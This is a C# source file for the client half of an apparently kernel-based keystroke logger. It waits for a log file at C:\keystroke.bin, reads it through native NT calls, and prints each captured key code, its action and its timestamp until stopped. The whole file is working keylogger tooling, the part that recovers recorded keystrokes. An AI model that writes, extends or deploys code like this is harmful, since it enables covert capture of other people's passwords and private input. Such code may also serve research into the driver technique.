using System;
using System.IO;
using System.Runtime.InteropServices;
using GetKeyStrokeClient.Interop;

namespace GetKeyStrokeClient.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool StartMonitor()
        {
            NTSTATUS ntstatus;
            IntPtr hDirectory;
            var logFilePath = @"C:\keystroke.bin";
            var bSuccess = false;

            using (var objectAttributes = new OBJECT_ATTRIBUTES(
                string.Format(@"\??\{0}", Path.GetDirectoryName(logFilePath)),
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive))
            {
                ntstatus = NativeMethods.NtCreateFile(
                    out hDirectory,
                    ACCESS_MASK.GENERIC_READ | ACCESS_MASK.SYNCHRONIZE,
                    in objectAttributes,
                    out IO_STATUS_BLOCK _,
                    IntPtr.Zero,
                    FILE_ATTRIBUTE_FLAGS.Directory,
                    FILE_SHARE_ACCESS.READ,
                    FILE_CREATE_DISPOSITION.OPEN,
                    FILE_CREATE_OPTIONS.DIRECTORY_FILE | FILE_CREATE_OPTIONS.SYNCHRONOUS_IO_NONALERT,
                    IntPtr.Zero,
                    0u);
            }

            if (ntstatus == Win32Consts.STATUS_SUCCESS)
            {
                do
                {
                    IntPtr hLogFile;
                    int nCurrentOffset = 0;
                    var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
                    var nUnitSize = Marshal.SizeOf(typeof(KEYSTROKE_INFORMATION));
                    bSuccess = File.Exists(logFilePath);

                    if (!bSuccess)
                    {
                        Console.WriteLine("[*] {0} is not found. Waiting for creation.", logFilePath);
                        bSuccess = Helpers.WaitFileCreation(hDirectory, Path.GetFileName(logFilePath));
                    }

                    if (!bSuccess)
                    {
                        Console.WriteLine("[-] Failed to open log file.");
                        break;
                    }

                    using (var objectAttributes = new OBJECT_ATTRIBUTES(
                        @"\??\C:\keystroke.bin",
                        OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive))
                    {
                        ntstatus = NativeMethods.NtCreateFile(
                            out hLogFile,
                            ACCESS_MASK.GENERIC_READ | ACCESS_MASK.SYNCHRONIZE,
                            in objectAttributes,
                            out IO_STATUS_BLOCK _,
                            IntPtr.Zero,
                            FILE_ATTRIBUTE_FLAGS.Normal | FILE_ATTRIBUTE_FLAGS.ReadOnly,
                            FILE_SHARE_ACCESS.VALID_FLAGS,
                            FILE_CREATE_DISPOSITION.OPEN,
                            FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE | FILE_CREATE_OPTIONS.SYNCHRONOUS_IO_NONALERT,
                            IntPtr.Zero,
                            0u);
                    }

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Failed to open log file (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[*] Log file is opened successfully.\n");
                    }

                    NativeMethods.NtCreateEvent(
                        out IntPtr hEvent,
                        ACCESS_MASK.EVENT_ALL_ACCESS,
                        IntPtr.Zero,
                        EVENT_TYPE.SynchronizationEvent,
                        BOOLEAN.FALSE);
                    Globals.StopEvent = hEvent;
                    NativeMethods.SetConsoleCtrlHandler(Marshal.GetFunctionPointerForDelegate((PHANDLER_ROUTINE)OnControlKey), true);

                    do
                    {
                        var nLogFileSize = (int)Helpers.GetFileSize(hLogFile);

                        if ((nLogFileSize % nUnitSize) != 0)
                        {
                            Console.WriteLine("[!] Something wrong with {0}.", logFilePath);
                            bSuccess = false;
                            break;
                        }

                        if (nLogFileSize > nCurrentOffset)
                        {
                            var nDataSize = nLogFileSize - nCurrentOffset;
                            var pDataBuffer = Helpers.ReadFileContents(hLogFile, nCurrentOffset, nDataSize);
                            var nEntryCount = nDataSize / nUnitSize;

                            if (pDataBuffer == IntPtr.Zero)
                            {
                                Console.WriteLine("[-] Failed to read log file.");
                                break;
                            }

                            for (var idx = 0; idx < nEntryCount; idx++)
                            {
                                IntPtr pEntry;

                                if (Environment.Is64BitProcess)
                                    pEntry = new IntPtr(pDataBuffer.ToInt64() + (idx * nUnitSize));
                                else
                                    pEntry = new IntPtr(pDataBuffer.ToInt32() + (idx * nUnitSize));

                                var info = (KEYSTROKE_INFORMATION)Marshal.PtrToStructure(
                                    pEntry,
                                    typeof(KEYSTROKE_INFORMATION));

                                Console.WriteLine("[{0}] Unit ID - {1}; Key Code - 0x{2}; Action - {3}",
                                    Helpers.ConvertLargeIntegerToLocalTimeString(info.TimeStamp),
                                    info.KeyboardInput.UnitId,
                                    info.KeyboardInput.MakeCode.ToString("X4"),
                                    info.KeyboardInput.Flags.ToString());
                            }

                            Marshal.FreeHGlobal(pDataBuffer);
                            nCurrentOffset += nDataSize;
                        }

                        ntstatus = NativeMethods.NtWaitForSingleObject(Globals.StopEvent, BOOLEAN.FALSE, in timeout);
                    } while (ntstatus == Win32Consts.STATUS_TIMEOUT);

                    NativeMethods.NtClose(Globals.StopEvent);
                } while (false);

                NativeMethods.NtClose(hDirectory);
            }

            Console.WriteLine("\n[*] Done.\n");

            return bSuccess;
        }


        public static bool OnControlKey(CTRL_TYPES type)
        {
            if (type == CTRL_TYPES.C_EVENT)
                NativeMethods.NtSetEvent(Globals.StopEvent, out uint _);

            return true;
        }
    }
}
